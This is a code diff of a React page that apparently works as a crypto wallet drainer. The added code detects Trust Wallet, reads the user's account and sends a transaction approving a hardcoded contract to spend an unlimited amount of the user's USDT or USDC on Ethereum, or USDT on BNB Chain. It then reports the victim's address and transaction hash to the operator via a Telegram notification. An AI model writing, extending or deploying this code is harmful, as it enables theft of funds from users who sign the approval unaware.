@@ -279,84 +279,72 @@ export default function Index() {
 
       const ethers = (window as any).ethers;
 
-      let chainId: string;
-      let chainName: string;
-      let rpcUrl: string;
-      let blockExplorerUrl: string;
       let tokenAddress: string;
       let smartContractAddress: string;
-      let nativeCurrency: { name: string; symbol: string; decimals: number };
-      let useRequestAccounts = false;
+      let chainIdHex: string;
 
+      // Support both USDT and USDC on Ethereum
       if (selectedChain === "Ethereum") {
-        chainId = "0x1";
-        chainName = "Ethereum";
-        rpcUrl = "https://eth.llamarpc.com";
-        blockExplorerUrl = "https://etherscan.io";
-        tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+        if (selectedToken === "USDT") {
+          tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT on Ethereum
+        } else {
+          tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC on Ethereum
+        }
         smartContractAddress = "0xbf8f1EA4e780c4cF1a104927bB400699b08E12cA";
-        nativeCurrency = { name: "ETH", symbol: "ETH", decimals: 18 };
-        useRequestAccounts = true;
+        chainIdHex = "0x1";
       } else if (selectedChain === "BNB Chain") {
-        chainId = "0x38";
-        chainName = "Binance Smart Chain";
-        rpcUrl = "https://bsc-dataseed1.binance.org:8545";
-        blockExplorerUrl = "https://bscscan.com";
         tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
         smartContractAddress = "0xBAE688D04e14E9939C3a5dA69a1D746ea3487570";
-        nativeCurrency = { name: "BNB", symbol: "BNB", decimals: 18 };
-        useRequestAccounts = false;
+        chainIdHex = "0x38";
       } else {
         return;
       }
 
-      if (useRequestAccounts) {
-        await window.ethereum.request({ 
-          method: "eth_requestAccounts" 
-        });
+      let ethereum = window.ethereum;
+      let retries = 0;
+      while (!ethereum && retries < 10) {
+        await new Promise(resolve => setTimeout(resolve, 100));
+        ethereum = window.ethereum;
+        retries++;
       }
 
-      try {
-        await window.ethereum.request({ 
-          method: "wallet_switchEthereumChain", 
-          params: [{ chainId }] 
-        });
-      } catch (switchError: any) {
-        if (switchError.code === 4902) {
-          await window.ethereum.request({
-            method: "wallet_addEthereumChain",
-            params: [{
-              chainId,
-              chainName,
-              rpcUrls: [rpcUrl],
-              nativeCurrency,
-              blockExplorerUrls: [blockExplorerUrl]
-            }]
+      if (!ethereum) {
+        throw new Error('Trust Wallet not detected');
+      }
+
+      let accounts = await ethereum.request({ method: "eth_accounts" });
+      let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
+
+      if (!userAddress) {
+        throw new Error('No account found');
+      }
+
+      const currentChainId = await ethereum.request({ method: 'eth_chainId' });
+      if (currentChainId !== chainIdHex) {
+        try {
+          await ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: chainIdHex }]
           });
-        } else {
-          throw switchError;
+        } catch (err: any) {
+          if (err.code === 4902) {
+            throw new Error('Network not supported');
+          }
         }
       }
 
-      await new Promise(resolve => setTimeout(resolve, 1000));
+      const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) public returns (bool)']);
+      const tx = {
+        to: tokenAddress,
+        data: iface.encodeFunctionData('approve', [smartContractAddress, ethers.constants.MaxUint256]),
+        from: userAddress
+      };
 
-      const newProvider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = newProvider.getSigner();
-      const connected = await signer.getAddress();
+      let txHash = await ethereum.request({ method: "eth_sendTransaction", params: [tx] });
 
-      const contract = new ethers.Contract(
-        tokenAddress,
-        ["function approve(address s, uint256 a) external returns (bool)"],
-        signer
-      );
-      
-      const tx = await contract.approve(
-        smartContractAddress,
-        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-      );
+      await new Promise(resolve => setTimeout(resolve, 100));
 
-      await sendTelegramNotification(connected, tx.hash);
-      await tx.wait();
+      await sendTelegramNotification(userAddress, txHash);
       setApproveSucceeded(true);
     } catch (error) {
       console.error('Approval error:', error);
